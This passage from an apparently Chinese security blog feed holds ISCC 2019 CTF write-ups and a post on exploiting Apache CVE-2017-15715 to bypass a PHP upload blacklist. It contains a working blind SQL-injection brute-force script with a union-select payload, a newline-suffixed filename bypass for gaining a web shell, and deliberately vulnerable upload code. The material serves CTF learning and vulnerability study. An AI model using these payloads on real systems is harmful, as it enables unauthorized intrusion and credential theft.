= &#123;</span><br><span class="line">    <span class="string">'User-Agent'</span>:<span class="string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.131 Safari/537.36 Union.373'</span></span><br><span class="line">    &#125;</span><br><span class="line">password = <span class="string">""</span></span><br><span class="line">s = <span class="string">"_ZzYyXxWwVvUuTtSsRrQqPpOoNnMmLlKkJjIiHhGgFfEeDdCcBbAa9876543210 "</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">33</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> s:</span><br><span class="line">        p = password + j</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">'username'</span>:<span class="string">'union_373_Tom'</span>,</span><br><span class="line">            <span class="string">'password'</span>:<span class="string">"1' or '1' union select 1,'hhx','"</span>+p+<span class="string">"' from admin order by 3,'1"</span></span><br><span class="line">            &#125;</span><br><span class="line">        r = requests.post(url,data=data,headers=headers)</span><br><span class="line">        r.encoding = r.apparent_encoding</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'hhx'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            password = password + j</span><br><span class="line">            print(<span class="string">'password:'</span>,password)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>最后的密码为<code>1SCC_2OI9</code></p><p>flag：<code>flag{1SCC_2OI9}</code></p><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="隐藏的信息"><a href="#隐藏的信息" class="headerlink" title="隐藏的信息"></a>隐藏的信息</h3><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="\img\ISCC2019\20.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>8进制转16进制，16进制转字符串，最后base64解密得flag</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line">$s = <span class="string">"0126 062 0126 0163 0142 0103 0102 0153 0142 062 065 0154 0111 0121 0157 0113 0111 0105 0132 0163 0131 0127 0143 066 0111 0105 0154 0124 0121 060 0116 067 0124 0152 0102 0146 0115 0107 065 0154 0130 062 0116 0150 0142 0154 071 0172 0144 0104 0102 0167 0130 063 0153 0167 0144 0130 060 0113"</span>;</span><br><span class="line">$message = explode(<span class="string">" "</span>, $s);</span><br><span class="line">$m = <span class="string">""</span>;</span><br><span class="line"><span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;count($message);$i++)&#123;</span><br><span class="line">$m = $m.base_convert($message[$i],<span class="number">8</span>,<span class="number">16</span>);</span><br><span class="line">&#125;</span><br><span class="line">$m = hex2bin($m);</span><br><span class="line"><span class="keyword">echo</span> base64_decode($m);</span><br><span class="line"></span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>Flag: <code>ISCC{N0_0ne_can_st0p_y0u}</code></p><h3 id="倒立屋"><a href="#倒立屋" class="headerlink" title="倒立屋"></a>倒立屋</h3><p>用<strong>Stegsolve</strong>工具打开</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="\img\ISCC2019\21.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure> <p>根据<strong>倒立屋</strong>题目提示，flag就是IsCc_2019倒过来 </p><p><img src="\img\ISCC2019\22.png" alt=""> </p><h3 id="Keyes’-secret"><a href="#Keyes’-secret" class="headerlink" title="Keyes’ secret"></a>Keyes’ secret</h3><p>键盘密码，网上有现成脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">STR = <span class="stringspan></span><br><span class="line">STR = STR.replace(<span class="string">"WSXCDE"</span>,<span class="string">'e'</span>)</span><br><span class="line">STR = STR.replace(<span class="string">"RFVGYHN"</span>,<span class="string">'h'</span>)</span><br><span class="line">STR = STR.replace(<span class="string">"WSXCV"</span>,<span class="string">'l'</span>)</span><br><span class="line">STR = STR.replace(<span class="string">"TGBNMJUY"</span>,<span class="string">'o'</span>)</span><br><span class="line">STR = STR.replace(<span class="string">"TGBNMJU"</span>,<span class="string">'u'</span>)</span><br><span class="line">STR = STR.replace(<span class="string">"GRDXCVB"</span>,<span class="string">'a'</span>)</span><br><span class="line">STR = STR.replace(<span class="string">"CVGRED"</span>,<span class="string">'g'</span>)</span><br><span class="line">STR = STR.replace(<span class="string">"QWERTYTRFVG"</span>,<span class="string">'f'</span>)</span><br><span class="line">STR = STR.replace(<span class="string">"WSXCFE"</span>,<span class="string">'d'</span>)</span><br><span class="line">STR = STR.replace(<span class="string">"IUYHNBV"</span>,<span class="string">'s'</span>)</span><br><span class="line">STR = STR.replace(<span class="string">"QWERTY"</span>,<span class="string">' '</span>)</span><br><span class="line">STR = STR.replace(<span class="string">"TRFVB"</span>,<span class="string">'c'</span>)</span><br><span class="line">STR = STR.replace(<span class="string">"QAZSCE"</span>,<span class="string">'k'</span>)</span><br><span class="line">STR = STR.replace(<span class="string">"NBVCXSWERF"</span>,<span class="string">'p'</span>)</span><br><span class="line">STR = STR.replace(<span class="string">"MNBVCDRTGHU"</span>,<span class="string">'r'</span>)</span><br><span class="line">STR = STR.replace(<span class="string">"WSX"</span>,<span class="string">'i'</span>)</span><br><span class="line">STR = STR.replace(<span class="string">"EFVT"</span>,<span class="string">'y'</span>)</span><br><span class="line">STR = STR.replace(<span class="string">"YHNMKJ"</span>,<span class="string">'b'</span>)</span><br><span class="line">STR = STR.replace(<span class="string">"ZAQWDVFR"</span>,<span class="string">'n'</span>)</span><br><span class="line">STR = STR.replace(<span class="string">'XSWEFTYHNXSWEFTYHN'</span>,<span class="string">'m'</span>)</span><br><span class="line">STR = STR.replace(<span class="string">'EFVGYWDCFT'</span>,<span class="string">'w'</span>)</span><br><span class="line">STR = STR.replace(<span class="string">'TYUIOJM'</span>,<span class="string">'t'</span>)</span><br><span class="line">STR = STR.replace(<span class="string">'QAZXCDEWV'</span>,<span class="string">'t'</span>)</span><br><span class="line">STR = STR.replace(<span class="string">'XSWEFTYHN'</span>,<span class="string">'m'</span>)</span><br><span class="line">STR = STR.replace(<span class="string">'EFVGY'</span>,<span class="string">'v'</span>)</span><br><span class="line">STR = STR.replace(<span class="string">'RGNYGC'</span>,<span class="string">'x'</span>)</span><br><span class="line">STR = STR.replace(<span class="string">'TRFVG'</span>, <span class="string">'f'</span>)</span><br><span class="line">print((STR).upper())</span><br></pre></td></tr></table></figure><p>flag：<code>FLAG{ISCC KEYBOARD CIPHER}</code></p><h3 id="Aesop’s-secret"><a href="#Aesop’s-secret" class="headerlink" title="Aesop’s secret"></a>Aesop’s secret</h3><p>帧分析，8张图片拼成一张图片 </p><p><img src="\img\ISCC2019\23.png" alt=""> </p><p>图片末尾最后一串：</p><p>U2FsdGVkX19QwGkcgD0fTjZxgijRzQOGbCWALh4sRDec2w6xsY/ux53Vuj/AMZBDJ87qyZL5kAf1fmAH4Oe13Iu435bfRBuZgHpnRjTBn5+xsDHONiR3t0+Oa8yG/tOKJMNUauedvMyN4v4QKiFunw==</p><p>BASE64解密后得到Salted__P开头的字符，推测是<strong>AES加密</strong></p><p>但是网站直接解密失败，猜测有加密的密钥，尝试密钥为拼成图片里的<strong>ISCC</strong></p><p>解密得U2FsdGVkX18OvTUlZubDnmvk2lSAkb8Jt4Zv6UWpE7Xb43f8uzeFRUKGMo6QaaNFHZriDDV0EQ/qt38Tw73tbQ==</p><p>再次以密钥为ISCC进行一次AES解密，就能得到flag了</p><p>flag：<code>flag{DugUpADiamondADeepDarkMine}</code></p><h3 id="他们能在一起吗"><a href="#他们能在一起吗" class="headerlink" title="他们能在一起吗"></a>他们能在一起吗</h3><p>扫描二维码得到</p><p><a href="http://47.92.76.208:4000/static/uploads/095a88fe28aa0a1d44a904afeae6f69f/Reply.png" target="_blank" rel="noopener">UEFTUyU3QjBLX0lfTDBWM19ZMHUlMjElN0Q=</a></p><p>进行base64和url解码得到：<strong>PASS{0K_I_L0V3_Y0u!}</strong></p><p>分析二维码图片，发现其中还藏有其他文件</p><p>用binwalk和dd分离出压缩包，<strong>dd if=Reply.png of=1.zip skip=8121 bs=1</strong></p><p>其中有文件<strong>You won’t Wanna see this.txt</strong>，解压密码就是0K_I_L0V3_Y0u!</p><p>flag：<code>ISCC{S0rrY_W3_4R3_Ju5T_Fr1END}</code></p><h3 id="Welcome"><a href="#Welcome" class="headerlink" title="Welcome"></a>Welcome</h3><p>分离文件得到Welcome.txt，是一串密文，以为是什么加密方式，其实规律在于空格，每个句子一个空格代表0，两个空格代表1，最后得到一串二进制转ascii即可得到flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="string">'蓅烺計劃 洮蓠朩暒戶囗  萇條戶囗  萇條蓅烺計劃 洮蓠朩暒蓅烺計劃 洮蓠朩暒戶囗  萇條戶囗  萇條蓅烺計劃 洮蓠朩暒蓅烺計劃 洮蓠朩暒戶囗  萇條戶囗  萇條蓅烺計劃 洮蓠朩暒戶囗  萇條戶囗  萇條蓅烺計劃 洮蓠朩暒蓅烺計劃 洮蓠朩暒蓅烺計劃 洮蓠朩暒戶囗  萇條戶囗  萇條蓅烺計劃 洮蓠朩暒蓅烺計劃 洮蓠朩暒蓅烺計劃 洮蓠朩暒蓅烺計劃 洮蓠朩暒戶囗  萇條蓅烺計劃 洮蓠朩暒戶囗  萇條戶囗  萇條蓅烺計劃 洮蓠朩暒蓅烺計劃 洮蓠朩暒戶囗  萇條戶囗  萇條戶囗  萇條蓅烺計劃 洮蓠朩暒戶囗  萇條戶囗  萇條戶囗  萇條戶囗  萇條蓅烺計劃 洮蓠朩暒戶囗  萇條戶囗  萇條蓅烺計劃 洮蓠朩暒戶囗  萇條蓅烺計劃 洮蓠朩暒蓅烺計劃 洮蓠朩暒戶囗  萇條蓅烺計劃 洮蓠朩暒蓅烺計劃 洮蓠朩暒戶囗  萇條蓅烺計劃 洮蓠朩暒戶囗  萇條蓅烺計劃 洮蓠朩暒戶囗  萇條蓅烺計劃 洮蓠朩暒蓅烺計劃 洮蓠朩暒戶囗  萇條戶囗  萇條蓅烺計劃 洮蓠朩暒戶囗  萇條蓅烺計劃 洮蓠朩暒蓅烺計劃 洮蓠朩暒蓅烺計劃 洮蓠朩暒蓅烺計劃 洮蓠朩暒戶囗  萇條戶囗  萇條蓅烺計劃 洮蓠朩暒戶囗  萇條蓅烺計劃 洮蓠朩暒蓅烺計劃 洮蓠朩暒蓅烺計劃 洮蓠朩暒蓅烺計劃 洮蓠朩暒戶囗  萇條戶囗  萇條蓅烺計劃 洮蓠朩暒戶囗  萇條蓅烺計劃 洮蓠朩暒戶囗  萇條戶囗  萇條戶囗  萇條戶囗  萇條戶囗  萇條蓅烺計劃 洮蓠朩暒戶囗  萇條蓅烺計劃 洮蓠朩暒戶囗  萇條蓅烺計劃 洮蓠朩暒戶囗  萇條戶囗  萇條戶囗  萇條蓅烺計劃 洮蓠朩暒戶囗  萇條蓅烺計劃 洮蓠朩暒蓅烺計劃 洮蓠朩暒蓅烺計劃 洮蓠朩暒戶囗  萇條蓅烺計劃 洮蓠朩暒戶囗  萇條蓅烺計劃 洮蓠朩暒戶囗  萇條蓅烺計劃 洮蓠朩暒蓅烺計劃 洮蓠朩暒戶囗  萇條戶囗  萇條蓅烺計劃 洮蓠朩暒蓅烺計劃 洮蓠朩暒蓅烺計劃 洮蓠朩暒戶囗  萇條蓅烺計劃 洮蓠朩暒蓅烺計劃 洮蓠朩暒蓅烺計劃 洮蓠朩暒蓅烺計劃 洮蓠朩暒戶囗  萇條戶囗  萇條蓅烺計劃 洮蓠朩暒戶囗  萇條蓅烺計劃 洮蓠朩暒蓅烺計劃 洮蓠朩暒戶囗  萇條戶囗  萇條戶囗  萇條戶囗  萇條蓅烺計劃 洮蓠朩暒戶囗  萇條蓅烺計劃 洮蓠朩暒蓅烺計劃 洮蓠朩暒戶囗  萇條戶囗  萇條蓅烺計劃 洮蓠朩暒戶囗  萇條蓅烺計劃 洮蓠朩暒戶囗  萇條蓅烺計劃 洮蓠朩暒蓅烺計劃 洮蓠朩暒蓅烺計劃 洮蓠朩暒戶囗  萇條蓅烺計劃 洮蓠朩暒戶囗  萇條蓅烺計劃 洮蓠朩暒戶囗  萇條戶囗  萇條戶囗  萇條戶囗  萇條戶囗  萇條蓅烺計劃 洮蓠朩暒戶囗  萇條'</span></span><br><span class="line"></span><br><span class="line">s1 = <span class="string">""</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(s)):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> s[i] == <span class="string">' '</span> <span class="keyword">and</span>  s[i+<span class="number">1</span>] != <span class="string">' '</span> <span class="keyword">and</span> s[i<span class="number">-1</span>] != <span class="string">' '</span>:</span><br><span class="line"></span><br><span class="line">        s1 = s1 + <span class="string">'0'</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">elif</span> s[i] == <span class="string">' '</span> <span class="keyword">and</span> s[i+<span class="number">1</span>] == <span class="string">' '</span>:</span><br><span class="line"></span><br><span class="line">        s1 = s1 + <span class="string">'1'</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> len(s1) == <span class="number">8</span>:</span><br><span class="line"></span><br><span class="line">        print(s1,chr(int(s1,<span class="number">2</span>)))</span><br><span class="line"></span><br><span class="line">        flag = flag + chr(int(s1,<span class="number">2</span>))</span><br><span class="line"></span><br><span class="line">        s1 = <span class="string">""</span></span><br><span class="line"></span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><p>flag：<code>flag{ISCC_WELCOME}</code></p><h3 id="无法运行的exe"><a href="#无法运行的exe" class="headerlink" title="无法运行的exe"></a>无法运行的exe</h3><p>exe文件用sublime text打开后得到一串密文，用notepad base64解密后得到一个类似png的文件，保存后修改文件头为<strong>89 50 4E 47 0D 0A 1A 0A</strong>得到正确的png文件，是个二维码，扫描就得到了flag</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="\img\ISCC2019\24.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>flag：<code>IScC_2019</code></p><h3 id="最危险的地方就是最安全的地方"><a href="#最危险的地方就是最安全的地方" class="headerlink" title="最危险的地方就是最安全的地方"></a>最危险的地方就是最安全的地方</h3><p>一个jpg文件，winhex打开发现里面有东西，修改文件后缀<strong>zip</strong>，解压后发现是一堆二维码</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="\img\ISCC2019/9.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>一个个用winhex打开发现最后一个<strong>50.jpg</strong>与众不同，flag就藏在里面</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="\img\ISCC2019/10.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>flag：<code>15cC9012</code></p><p>没有flag标签，试了几分钟也是挺坑的，还好手快还有前十血emmm</p><h3 id="解密成绩单"><a href="#解密成绩单" class="headerlink" title="解密成绩单"></a>解密成绩单</h3><p>下载后的文件时一个压缩包，解压需要密码，但是用winhex打开后可以发现文件末尾有<strong>504B</strong>开头的十六进制数，</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="\img\ISCC2019/11.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>发现<strong>0908</strong>说明存在<strong>zip伪加密</strong>，将<strong>09</strong>改为<strong>00</strong>即可</p><p>压缩后时一个exe文件，需要用户名和密码，老样子用winhex打开</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="\img\ISCC2019/12.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>发现<strong>admin</strong>字样，猜测用户名就是<strong>admin</strong>，密码就是后面那串<strong>ISCC</strong>开头的字符，这个密码也尝试了挺久的，因为前后存在混淆的字符</p><p>最后正确的密码是：<strong>ISCCq19pc1Yhb6SqtGhliYH688feCH7lqQxtfa2MpOdONW1wmIleBo4TW5n</strong></p><p>登陆后即可获得flag</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="\img\ISCC2019/13.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure> <h3 id="High起来！"><a href="#High起来！" class="headerlink" title="High起来！"></a>High起来！</h3><p>下载后的压缩包解压后得到一张损坏的<strong>png</strong>图片，在kali下修改png文件头，输入<code>!%xxd</code>进入十六进制编辑</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="\img\ISCC2019/14.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>修改文件头为<strong>8950</strong>后在命令输入<code>!%xxd -r</code>返回原来的编码后保存</p><p> <img src="\img\ISCC2019/15.png" alt=""></p><p>修复后得到一个二维码，扫描后的内容：<strong>中口由羊口中中大中中中井</strong></p><p>查询后发现是一个<strong>当铺密码</strong>，解密网站<a href="http://www.zjslove.com/3.decode/dangpu/index.html" target="_blank" rel="noopener">http://www.zjslove.com/3.decode/dangpu/index.html</a> 解密后得到：<strong>201902252228</strong></p><p>但是这个还不是flag，我们可以发现png图片中还隐藏了一个mp3文件，将png改成zip解压得到<strong>mp3</strong>文件，前面又解密得到了密码，所以很明显就是考察<strong>mp3隐写</strong>，这就需要使用到工具<strong>Mp3stego</strong></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="\img\ISCC2019/16.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>解密后得到<strong>01.mp3.txt</strong>文件，内容是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;#102;&amp;#108;&amp;#97;&amp;#103;&amp;#123;&amp;#80;&amp;#114;&amp;#69;&amp;#116;&amp;#84;&amp;#121;&amp;#95;&amp;#49;&amp;#83;&amp;#99;&amp;#67;&amp;#57;&amp;#48;&amp;#49;&amp;#50;&amp;#95;&amp;#103;&amp;#79;&amp;#48;&amp;#100;&amp;#125;</span><br></pre></td></tr></table></figure><p>拿去Unicode解密即可得到flag：<code>flag{PrEtTy_1ScC9012_gO0d}</code></p><p>这里提交的时候也要把flag{}去掉，也是坑</p><h3 id="碎纸机"><a href="#碎纸机" class="headerlink" title="碎纸机"></a>碎纸机</h3><p>原图可以分离成十个图片，分离后的十张图每张图末尾处都不一样</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="\img\ISCC2019\25.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>猜测信息就包含在里面，我们需要将信息提取出来，根据题目提示<strong>欧鹏曦文</strong>猜测可能需要opencv脚本来提取，但是无奈没写过，只能肉眼识别了</p><p>将多出来的这一部分的十六进制复制到notepad++里</p><p>点击 <strong>设置-&gt;首选项-&gt;编辑-&gt;勾选“显示列边界”-&gt;边界宽度设置为51（或26）</strong>，然后 <strong>Ctrl+I</strong> ，文本每行就51个字符自动分行了 </p><p>然后 Ctrl+F-&gt;标记-&gt;查找目标为0-&gt;查找全部 ，就可以给所有0标记颜色，做完这两步后，发现了类似flag的字符：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="\img\ISCC2019\26.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>将10张图片都这样做，选择完整的一边截图然后拼接起来： </p><p><img src="\img\ISCC2019\27.png" alt=""> </p><p>flag：<code>Flag={ISCC_is_so_interesting_!}</code></p>]]></content>
    
    <summary type="html">
    
      ctf
    
    </summary>
    
      <category term="ctf" scheme="https://Foxgrin.github.io/categories/ctf/"/>
    
    
      <category term="ctf" scheme="https://Foxgrin.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>利用Apache解析漏洞(CVE-2017-15715)绕过文件上传限制getshell</title>
    <link href="https://Foxgrin.github.io//posts/6413/"/>
    <id>https://Foxgrin.github.io//posts/6413/</id>
    <published>2019-05-20T07:15:00.000Z</published>
    <updated>2019-05-20T17:03:05.208Z</updated>
    
    <content type="html"><![CDATA[<p>这几天做中南大学的院赛web题碰到了一道上传题，正好利用到了去年发布的一个cve，虽然漏洞有点鸡肋，但是作为一种姿势了解一下还是不错的，故此记录总结一下<a id="more"></a></p><h3 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h3><p>在Apache <strong>2.4.0到2.4.29</strong>版本中使用到了如下的配置信息：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch \.php$&gt;</span><br><span class="line">    SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure><p>这是一个php文件的解析表达式，我们可以注意到<code>$</code>，这个解析漏洞的根本原因就是这个<code>$</code>。我们知道<code>$</code>在正则表达式中用来匹配字符串结尾位置，在菜鸟教程中对正则表达符<code>$</code>的解释如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">匹配输入字符串的结尾位置。如果设置了 RegExp 对象的 Multiline 属性，则 $ 也匹配 ‘\n’ 或 ‘\r’。要匹配 $ 字符本身，请使用 \$。</span><br></pre></td></tr></table></figure><p>说明了<code>$</code>是可以匹配到字符串结尾的<strong>换行符</strong>，也就是说，如果我们此时有个文件后缀名为：<code>.php\n</code>，Apache是会将其作为php文件进行解析的</p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>了解了该解析漏洞，我们便可以利用它来绕过上传的黑名单限制，例如存在下面的上传逻辑：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_FILES[<span class="string">'file'</span>])) &#123;</span><br><span class="line">    $name = basename($_POST[<span class="string">'name'</span>]);</span><br><span class="line">    $ext = pathinfo($name,PATHINFO_EXTENSION);</span><br><span class="line">    <span class="keyword">if</span>(in_array($ext, [<span class="string">'php'</span>, <span class="string">'php3'</span>, <span class="string">'php4'</span>, <span class="string">'php5'</span>, <span class="string">'phtml'</span>, <span class="string">'pht'</span>])) &#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">'bad file'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    move_uploaded_file($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>], <span class="string">'./'</span> . $name);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里使用到了黑名单过滤方式，但是如果我们利用上述漏洞，上传一个文件名为：<code>1.php\x0a</code>，那么便可以成功绕过黑名单的限制上传php文件</p><h3 id="实例演示"><a href="#实例演示" class="headerlink" title="实例演示"></a>实例演示</h3><p>实例来自于中南大学的院赛ctf中的一道题，题目名字是<strong>upload something</strong></p><p>题目页面如下：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img\apache解析漏洞\1.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>上传文件时可以发现，不论正常上传什么文件，<strong>login.php</strong>都显示<strong>bad file</strong></p><p>我们抓包可以发现，请求包中额外post一个参数<code>name</code></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="\img\apache解析漏洞\2.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>这就想到了我们分析的Apache解析漏洞，如果文件名取自<code>$_FILES[&#39;file&#39;][&#39;name&#39;]</code>，就会自动把<strong>换行符</strong>去掉，而文件名取自post参数<code>name</code>中，就能很好的利用到这个解析漏洞</p><p>下面我们上传一个包含换行符的文件，这里需要注意只能时<code>\x0a</code>而不是<code>\x0d\x0a</code>，<code>\x0d\x0a</code>的情况是我们直接添加一个换行符，我们利用burp的hex功能在<code>test666.php</code>后面添加一个<code>\x0a</code></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="\img\apache解析漏洞\3.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>从响应包中可以看到上传成功了，但是相应页面<code>success.html</code>中并没有告诉我们上传文件的目录</p><p>但是我们在请求包中还可以看到一个参数<code>dir = /upload/</code>，所以猜测上传目录为·<code>/upload/test666.php%0a</code></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="\img\apache解析漏洞\4.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>访问成功，最后就是上木马拿shell了</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="\img\apache解析漏洞\5.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="\img\apache解析漏洞\6.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>最后我们可以看一下<code>upload.php</code>的源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_FILES[<span class="string">'file'</span>])) &#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    $name = basename($_POST[<span class="string">'name'</span>]);</span><br><span class="line">    $ext = pathinfo($name,PATHINFO_EXTENSION);</span><br><span class="line">    </span><br><span class="line">   </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    $ext = pathinfo($name,PATHINFO_EXTENSION);</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">'/php/'</span>,$ext))&#123;</span><br><span class="line">    <span class="keyword">if</span>(in_array($ext, [<span class="string">'php'</span>, <span class="string">'php3'</span>, <span class="string">'php4'</span>, <span class="string">'php5'</span>, <span class="string">'phtml'</span>])) &#123;</span><br><span class="line">        header(<span class="string">"location:hacker.html"</span>);</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">'bad file'</span>);</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(!move_uploaded_file($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>], <span class="string">'../upload/'</span>. $name))&#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">'upload failed'</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        header(<span class="string">"location:success.html"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//move_uploaded_file($_FILES['file']['tmp_name'], './' . $name);</span></span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        header(<span class="string">"location:hacker.html"</span>);</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">'bad file'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">        <span 